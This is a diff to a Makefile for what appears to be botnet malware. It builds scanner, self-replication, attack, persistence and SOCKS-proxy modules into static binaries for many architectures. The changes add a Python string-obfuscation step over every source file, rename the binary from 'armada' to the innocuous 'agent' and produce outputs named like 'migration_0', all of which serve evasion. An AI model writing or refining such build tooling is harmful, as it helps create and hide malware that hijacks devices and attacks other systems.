@@ -1,36 +1,47 @@
 CC        ?= gcc
-CFLAGS     = -Os -s -Wall -Wno-unused -Wno-all -ffunction-sections -fdata-sections -Iheaders
+CFLAGS     = -Os -s -Wall -Wno-unused -Wno-all -ffunction-sections -fdata-sections -Iheaders -I.
 LDFLAGS    = -lpthread -Wl,--gc-sections -Wl,--strip-all
-CORE_SRCS  = ds.c crypto.c config.c opsec.c connection.c commands.c persist.c socks.c main.c
-SCAN_SRCS  = telnet.c ssh.c scanner_http.c scan_report.c
-ATK_SRCS   = attack.c attack_method.c
-SRCS       = $(CORE_SRCS)
+
+# Plain source lists -- used by obfstr.py and as obf/ targets
+CORE_PLAIN  = ds.c crypto.c config.c opsec.c connection.c commands.c persist.c socks.c main.c
+SCAN_PLAIN  = ssh.c scanner_http.c scan_report.c
+ATK_PLAIN   = attack.c attack_method.c
+ALL_PLAIN   = $(CORE_PLAIN)
 
 ifneq ($(NO_SELFREP),1)
-SRCS      += $(SCAN_SRCS)
+ALL_PLAIN  += $(SCAN_PLAIN)
+CFLAGS     +=
 else
-CFLAGS    += -DNO_SELFREP
+CFLAGS     += -DNO_SELFREP
 endif
 
 ifneq ($(NO_ATTACK),1)
-SRCS      += $(ATK_SRCS)
+ALL_PLAIN  += $(ATK_PLAIN)
 else
-CFLAGS    += -DNO_ATTACK
+CFLAGS     += -DNO_ATTACK
 endif
 
-BIN        = armada
+OBF_DIR    = obf
+SRCS       = $(addprefix $(OBF_DIR)/,$(ALL_PLAIN))
+
+BIN        = agent
 XC        ?= /etc/xcompile
 BINS       = ../bins
 
-.PHONY: all clean all-arch
+.PHONY: all clean all-arch obf
 
 all: $(BIN)
 
-$(BIN):
+obf: obfstr.py $(ALL_PLAIN)
+	@mkdir -p $(OBF_DIR)
+	@python3 obfstr.py $(ALL_PLAIN)
+
+$(BIN): obf
 	$(CC) $(CFLAGS) -B/usr/bin -o $@ $(SRCS) $(LDFLAGS)
 
 clean:
 	rm -f $(BIN)
+	rm -rf $(OBF_DIR)
 	@mkdir -p $(BINS) && rm -f $(BINS)/*
 
 # Universal cross-build for relocated uClibc toolchains
@@ -58,7 +69,7 @@ define XS
 		echo "$$(du -h $(BINS)/$(2) | cut -f1)" || echo "FAIL"
 endef
 
-all-arch: $(BIN)
+all-arch: obf $(BIN)
 	@echo "=== Building all architectures (pure C, static, zero deps) ==="
 	@echo -n "  native... " && du -h $(BIN) | cut -f1
 	@mkdir -p $(BINS) && cp -f $(BIN) $(BINS)/migration_0
